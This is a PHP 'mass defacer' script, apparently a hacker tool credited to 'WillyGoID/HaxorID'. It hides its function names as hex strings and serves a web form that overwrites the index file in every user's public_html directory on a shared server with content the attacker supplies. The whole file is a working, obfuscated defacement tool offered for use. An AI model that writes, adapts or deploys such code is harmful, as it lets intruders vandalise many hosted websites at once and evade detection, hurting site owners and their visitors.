<?php
//WillyGoID, 07 March 2022
$fa = ["6765745f63757272656e745f75736572","66696c655f657869737473", "69735f646972", "6368646972","7363616e646972","66696c655f7075745f636f6e74656e7473", "6d6b646972", "646965", "66696c6574797065", "7374725f7265706c616365", "737472706f73", "61727261795f7368696674", "6578706c6f6465", "7374727472", "7374726c656e", "73747272706f73", "737562737472", "6576616c2829"];
for($i = 0; $i < count($fa); $i++){$f[$i] = hexa($fa[$i]);}
function hexa($str) {$r = "";$len = (strlen($str) - 1);for ($i = 0; $i < $len; $i += 2) {$r .= chr(hexdec($str[$i].$str[$i + 1]));}return $r;}
function strdir($str){return str_replace(array('\\', '//', '%27', '%22'), array('/', '/', '\'', '"'), chop($str));}
$myfile = $_SERVER['SCRIPT_FILENAME'] ? strdir($_SERVER['SCRIPT_FILENAME']) : strdir(__FILE__);
$myfile = $f[10]($myfile, $f[17]) ? $f[11]($f[12]('(', $myfile)) : $myfile;
define('rootdir', strdir($f[13]($myfile, array(strdir($_SERVER['PHP_SELF']) => '')) . '/'));
$cuser = $f[0]();
$lcuser = $f[14]($cuser);
$lastdir = $f[15](rootdir, $cuser)+$lcuser;
$homedir = $f[16](rootdir, 0, $lastdir);
echo "<title>Custom Mass Defacer - HaxorID</title>";
echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
echo "<body bgcolor='black'><font color='white'><font face='Electrolize'>";
echo "<center><form method='POST'>";
echo "Base Dir : <input type='text' name='home_dir' size='50' value='".$homedir."'><br><br>";
echo "Public_Html : <input type='text' name='public_dir' size='50' placeholder='public_html'><br><br>";
echo "File Name : <input type='text' name='file_name' value='index.php'><br><br>";
echo "Your Index : <br><textarea style='width: 685px; height: 330px;' name='index'>//Put Your Index Here</textarea><br>";
echo "<input type='submit' value='Start'></form></center>";
 
if (isset ($_POST['home_dir']))
{
	$public_dir = $_POST['public_dir'];
        if (!$f[1] ($_POST['home_dir']))
                $f[7] ($_POST['home_dir']." Not Found !<br>");
 
        if (!$f[2] ($_POST['home_dir']))
                $f[7] ($_POST['home_dir']." Is Not A Directory !<br>");
 
        @$f[3] ($_POST['home_dir']) or $f[7] ("Cannot Open Directory");
 
        $files = @$f[4] ($_POST['home_dir']) or $f[7] ("oohhh shet<br>");
 
        foreach ($files as $file):
                if ($file != "." && $file != ".." && @$f[8] ($file) == "dir")
                {		
						if($public_dir){
						  if (!$f[2]($_POST['home_dir']."/".$file."/".$public_dir)) {
							$f[6]($_POST['home_dir']."/".$file."/".$public_dir);}
						}
                        $index = $_POST['home_dir']."/".$file."/".$public_dir."/".$_POST['file_name'];
						$index = $f[9]("//","/",$index);
                        if ($f[5] ($index, $_POST['index']))	
                            echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: green'>OK</span><br>";
                }
        endforeach;
}

?>
